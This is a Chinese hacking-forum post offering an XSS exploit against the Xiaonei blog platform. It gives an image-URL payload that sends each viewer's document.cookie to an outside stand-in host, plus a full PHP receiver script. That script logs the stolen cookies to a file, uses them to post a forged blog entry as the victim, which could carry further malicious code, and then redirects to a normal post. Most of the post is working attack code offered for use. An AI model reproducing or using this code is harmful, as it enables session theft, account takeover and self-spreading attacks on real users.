@@ -1,0 +1,85 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+校内网最新 xss Cookies得到密码 exp
+D8888D主贴内容-------------------------------------------------------
+ 
+
+小帅那没JJ写的。。。
+处理掉一些没用信息。发上来了
+
+校内网在发blog时对插入图片过滤不严格，存在xss漏洞.
+
+在发blog时将插入图片URL写为如下代码即可触发： [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]1javascript:window.location.href='[url=http://www.xxx.com/test.php?cookie=]链接标记http://www.xxx.com/test.php?cookie=[/url]'+document.cookie
+test.php的作用是窃取cookie、伪造阅览者身份发一个blog、跳转到一个正常的日志,代码如下: [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]01<?php 
+
+02ob_start();  
+
+03$url = 'blog.xiaonei.com'; 
+
+04$cookie=$_GET['cookie']; 
+
+05$cookie1=$cookie."\r\n\r\n"; 
+
+06fputs(fopen('a.txt','a+'),$cookie1); //cookie写入 a.txt 
+
+07//发一条伪造的日志，这条日志里面也可以插入恶意代码 
+
+08$sock = fsockopen("$url", 80, $errno, $errstr, 30); 
+
+09if (!$sock) die("$errstr ($errno)\n"); 
+
+10$data = "title=test by fly&body=test by fly&categoryId=0&blogControl=99&passwordProtedted=0&passWord=&blog_pic_id=&pic_path=&activity=&id=&relative_optpe="; 
+
+11fwrite($sock, "POST [url=http:///]链接标记http://[/url]$url/NewEntry.do HTTP/1.1\r\n"); 
+
+12fwrite($sock, "Accept: */*\r\n"); 
+
+13fwrite($sock, "Referer: [url=http:///]链接标记http://[/url]$url\r\n"); 
+
+14fwrite($sock, "Accept-Language: zh-cn\r\n"); 
+
+15fwrite($sock, "Content-Type: application/x-www-form-urlencoded\r\n"); 
+
+16fwrite($sock, "Accept-Encoding: gzip, deflate\r\n"); 
+
+17fwrite($sock, "User-Agent: Mozilla\r\n"); 
+
+18fwrite($sock, "Host: $url\r\n"); 
+
+19fwrite($sock, "Content-Length: ".strlen($data)."\r\n"); 
+
+20fwrite($sock, "Connection: Keep-Alive\r\n"); 
+
+21fwrite($sock, "Cache-Control: no-cache\r\n"); 
+
+22fwrite($sock, "Cookie:".$cookie."\r\n\r\n"); 
+
+23fwrite($sock, $data); 
+
+24$headers = ""; 
+
+25while ($str = trim(fgets($sock, 4096))) 
+
+26$headers .= "$str\n"; 
+
+27echo "\n"; 
+
+28$body = ""; 
+
+29while (!feof($sock)) 
+
+30 $body .= fgets($sock, 4096); 
+
+31fclose($sock); 
+
+32//echo $body; 
+
+33//跳转到一个正常的日志 
+
+34Header("Location: [url][url=http://blog.xiaonei.com/GetEntry.do?id=xxxx&owner=xxxxx]链接标记http://blog.xiaonei.com/GetEntry.do?id=xxxx&owner=xxxxx[/url][/url]");  
+
+35ob_end_flush(); 
+
+36?>
+
